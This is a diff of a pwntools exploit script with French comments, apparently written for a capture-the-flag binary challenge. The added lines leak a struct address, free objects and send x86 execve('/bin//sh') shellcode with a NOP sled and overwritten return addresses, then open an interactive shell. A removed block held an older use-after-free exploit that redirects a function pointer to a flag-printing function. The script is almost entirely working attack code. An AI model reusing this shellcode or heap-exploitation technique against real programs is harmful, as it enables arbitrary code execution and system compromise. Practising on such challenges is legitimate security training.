@@ -1,3 +1,4 @@
+# coding: utf8
 import pwn
 import struct
 import pwnlib.util.packing
@@ -45,24 +46,38 @@ p.recv()
 p.sendline("2")
 p.recv()
 
+'''
 print("Seeking leaked @ now ! ")
 p.sendline("5")
 text = p.recv()
 
 addr = text[26:38]
-#print(addr)
+#print(addr.hex())
 import binascii
 addr=binascii.unhexlify(addr.hex()).decode('utf8')
 print(" Adresse turnOn de la struct: %s" % addr) 
-buffer = int(addr,16)- 58
+buffer = int(addr,16)- 56
 print("buffer @ = 0x%x" % buffer)
 #print("buffer @ = %s" % hex(buffer))
+hexa=hex(buffer)[2:]
+hexa="".join(reversed([hexa[i:i+2] for i in range(0, len(hexa), 2)]))
+final=""
+i=0
+for h in hexa:
+	if i % 2 ==0:
+		final=final+'\\x'
+	final=final+h
+	i=i+1
+final=final+"\x00\x00\x00"
+print(final)
 s= pwnlib.util.packing.p64(buffer, endian='little')
 #pwnlib.util.packing.u64()
 #s=buffer
+#print(ord(s))
 print(s)
 #print(binascii.unhexlify(binascii.hexlify(s)))
 #print("buffer packed =" + str(s))
+'''
 
 print("Destruction des 2 interfaces crees !") 
 #destroy
@@ -87,13 +102,20 @@ p.sendline("c")
 p.recv()
 #20 shellcode+ 12 NOP +4@ (8*4)=64
 #Shell:`perl -e 'print "\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "\x90" x 12 . "\xC8\xB2\xAE\xEB\xFF\x7F" x 4 '`
-shellcode="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"+"\x90" * 12 +"\xee\xa6c\xde\xff\x7f"*4
+shellcode="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"+"\x90" * 12 + ("\xb2\x1a\x00\x80"+"\x11"*4)*4
+#final*4
+#0x0000000008000ab2
+	
+# 0x7fffbe2a02f0
+#echo `perl -e 'print "\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "\x90" x 12 . "\xF0\x02\x2A\xBE\xFF\x7F\x00\x00" x 4 '` >/tmp/pipeTest
+#"\xee\xa6c\xde\xff\x7f"*4
 print("Shellcode: %s" % shellcode)
 print("Insertion du shellcode dans le champs ip #strdump")
 #ip
 #p.send(shellcode)
 #print("\xee\xa6c\xde\xff\x7f")
 #print(s * 4)
+#p.send(s*4)
 p.sendline(shellcode)
 p.recv()
 #turnon
@@ -103,67 +125,13 @@ p.recv()
 p.sendline("3")
 p.recv()
 
-print("trying...")
+print("trying...(infos)")
+#p.interactive()
 p.sendline("0")
 p.recv()
 p.sendline("2")
 p.recv()
-p.sendline("3")
+p.sendline("5")
 print(p.recv())
 
 p.interactive()
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-'''
-# Free the dog house
-p.sendline("7")
-p.recv()
-
-# Create the dog
-p.sendline("1")
-p.recv()
-p.sendline("AAAAAAAAAAAA")
-p.recv()
-
-# Leak the bark() address
-p.sendline("6")
-text = p.recv()
-print(text)
-
-addr = text[12:16]
-bark_func = struct.unpack("<L", addr)[0]
-print("bark() = 0x%08x" % bark_func)
-flag_func = bark_func + 0x66
-print("bringBackTheFlag() = 0x%08x" % flag_func)
-
-# Free the dog
-p.sendline("4")
-p.recv()
-
-# Reallocate a house with a specific name:
-# dog+offset(bark) = bringBackTheFlag
-p.sendline("5")
-p.recv()
-msg = 'A'*12 + struct.pack("<L", flag_func)
-p.sendline(msg)
-p.recv()
-p.sendline("housename")
-p.recv()
-
-# Ask the dog to bark to get the flag
-p.sendline("2")
-p.recv()
-'''
-#at the end: p.interactive()
